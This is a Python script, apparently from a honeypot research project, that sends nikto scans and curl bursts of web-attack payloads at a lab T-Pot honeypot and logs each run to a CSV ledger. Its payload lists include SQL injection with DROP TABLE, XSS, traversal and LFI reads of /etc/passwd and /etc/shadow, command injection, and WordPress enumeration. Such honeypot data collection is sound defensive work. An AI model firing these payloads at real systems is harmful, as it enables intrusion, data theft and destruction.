#!/usr/bin/env python3
import csv, os, shlex, subprocess, time, urllib.parse
from datetime import datetime, timezone

LEDGER  = "/mnt/c/tpot-project/01-run-ledger/run-ledger.csv"
LOG_DIR = "/mnt/c/tpot-project/02-raw-data/attack-logs"
TARGET  = "192.168.32.138"
SRC     = "192.168.32.1"
LABEL   = "web_attack"
PREFIX  = "W"
COOLDOWN = 25
MAX_RUNS = None

COLUMNS = ["run_id","attack_type_label","tool","exact_command","target_ip",
           "target_port","start_time_utc","end_time_utc","expected_honeypot",
           "src_ip_seen","notes"]

def utc_now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def rows_done():
    if not os.path.exists(LEDGER): return 0
    n = 0
    for r in csv.DictReader(open(LEDGER, newline="")):
        if r["run_id"].startswith(PREFIX) and r["run_id"][1:].isdigit(): n += 1
    return n

# a curl-burst run: many HTTP requests with payloads against one target/port
def curl_burst(port, payloads, base="/"):
    def one(p):
        url = f"http://{TARGET}:{port}{p}"
        return ["curl","-s","-o","/dev/null","--max-time","5",url]
    return payloads

SQLI = ["/index.html?id=1' OR '1'='1","/?id=1 UNION SELECT 1,2,3--","/login?user=admin'--",
        "/product?id=1;DROP TABLE users--","/search?q=1' AND SLEEP(5)--","/?id=1' OR 1=1#"]
XSS  = ["/search?q=<script>alert(1)</script>","/?name=<img src=x onerror=alert(1)>",
        "/comment?text=<svg/onload=alert(1)>","/?q=\"><script>alert(document.cookie)</script>"]
LFI  = ["/?page=../../../../etc/passwd","/?file=../../../../etc/shadow",
        "/index.php?page=....//....//etc/passwd","/?include=/etc/passwd%00"]
TRAV = ["/../../../../etc/passwd","/....//....//....//etc/hosts","/%2e%2e%2f%2e%2e%2fetc/passwd"]
CMD  = ["/?cmd=;cat /etc/passwd","/?exec=|whoami","/ping?ip=127.0.0.1;id"]
WP   = ["/wp-login.php","/xmlrpc.php","/wp-admin/","/readme.html","/wp-config.php",
        "/wp-content/","/?author=1","/wp-json/wp/v2/users"]

def build_runs():
    runs = []  # (kind, tool, port, payload_list_or_None, expected, note)
    # Nikto scans (tool does hundreds of requests itself)
    runs += [
        ("nikto","nikto",80,   None,"Snare/Tanner","nikto vs tanner :80"),
        ("nikto","nikto",8080, None,"Wordpot",     "nikto vs wordpot :8080"),
        ("nikto","nikto",80,   None,"Snare/Tanner","nikto vs tanner :80 (-Tuning 9 sqli/xss)"),
    ]
    # curl payload bursts at Tanner :80 (its classifier fires per request)
    combos = [
        (SQLI,"sqli burst"), (XSS,"xss burst"), (LFI,"lfi burst"),
        (TRAV,"path traversal burst"), (CMD,"cmd-injection burst"),
        (SQLI+XSS,"sqli+xss mixed"), (LFI+TRAV,"lfi+traversal mixed"),
        (SQLI*2,"sqli repeated (heavy)"), (XSS*2,"xss repeated (heavy)"),
        (SQLI+XSS+LFI,"multi-vector"), (SQLI+XSS+LFI+TRAV+CMD,"all-vectors big"),
    ]
    for pl, note in combos:
        runs.append(("curl","curl",80, pl,"Snare/Tanner", note))
    # Wordpot enumeration bursts :8080
    runs += [
        ("curl","curl",8080, WP,"Wordpot","wordpress enum"),
        ("curl","curl",8080, WP+WP,"Wordpot","wordpress enum heavy"),
        ("curl","curl",8080, WP+SQLI,"Wordpot","wp enum + sqli"),
    ]
    # a few more Tanner curl runs for volume/variety
    for pl, note in [(SQLI,"sqli burst B"),(XSS,"xss burst B"),(LFI,"lfi burst B"),
                     (SQLI+XSS,"mixed B"),(CMD,"cmd burst B"),(TRAV,"traversal B"),
                     (SQLI+XSS+LFI,"multi B"),(WP,"wp-paths at tanner"),
                     (SQLI*2,"sqli heavy B"),(XSS+LFI,"xss+lfi B"),
                     (SQLI+XSS+LFI+TRAV,"four-vector B"),(XSS*2,"xss heavy B"),
                     (SQLI+CMD,"sqli+cmd B")]:
        runs.append(("curl","curl",80, pl,"Snare/Tanner", note))
    return runs

def run_curl_burst(port, payloads):
    out = []
    for p in payloads:
        url = f"http://{TARGET}:{port}{p}"
        try:
            subprocess.run(["curl","-g","-s","-o","/dev/null","--max-time","5",url],
                           capture_output=True, text=True, timeout=8)
            out.append(f"GET {url}")
        except subprocess.TimeoutExpired:
            out.append(f"TIMEOUT {url}")
        time.sleep(1.5)
    return "\n".join(out)

def main():
    os.makedirs(os.path.dirname(LEDGER), exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    new = not os.path.exists(LEDGER)
    runs = build_runs()
    done = rows_done()
    todo = runs[done:][:MAX_RUNS] if MAX_RUNS is not None else runs[done:]
    if not todo:
        print("Nothing to run — ledger already has all web-attack runs."); return

    with open(LEDGER, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=COLUMNS)
        if new: w.writeheader()
        idx = done + 1
        first_start = last_end = None
        for kind, tool, port, payloads, hp, note in todo:
            rid = f"{PREFIX}{idx:03d}"; idx += 1
            print(f"[{rid}] {note}  ({tool} :{port})")
            start = utc_now(); first_start = first_start or start
            if kind == "nikto":
                tuning = "9" if "Tuning 9" in note else "123457"
                cmd = ["timeout","-k","5","90","nikto","-h",f"http://{TARGET}:{port}",
                       "-maxtime","75s","-Tuning",tuning,"-nointeractive"]
                cmdstr = " ".join(cmd)
                try:
                    res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    body = (res.stdout or "") + "\n" + (res.stderr or "")
                except subprocess.TimeoutExpired as e:
                    so = e.stdout.decode() if isinstance(e.stdout, bytes) else (e.stdout or "")
                    body = so + "\nNIKTO HARD TIMEOUT"
            else:
                cmdstr = f"curl-burst :{port} ({len(payloads)} reqs): " + " | ".join(payloads[:3]) + " ..."
                body = run_curl_burst(port, payloads)
            end = utc_now(); last_end = end
            open(f"{LOG_DIR}/{rid}.txt","w").write(f"# {rid} {note}\n# {cmdstr}\n\n{body}")
            w.writerow({"run_id":rid,"attack_type_label":LABEL,"tool":tool,
                        "exact_command":cmdstr,"target_ip":TARGET,"target_port":port,
                        "start_time_utc":start,"end_time_utc":end,"expected_honeypot":hp,
                        "src_ip_seen":SRC,"notes":note})
            f.flush()
            print(f"       {start} -> {end}   (cooldown {COOLDOWN}s)\n")
            time.sleep(COOLDOWN)
    print(f"Batch window (UTC): {first_start} -> {last_end}")

if __name__ == "__main__":
    main()
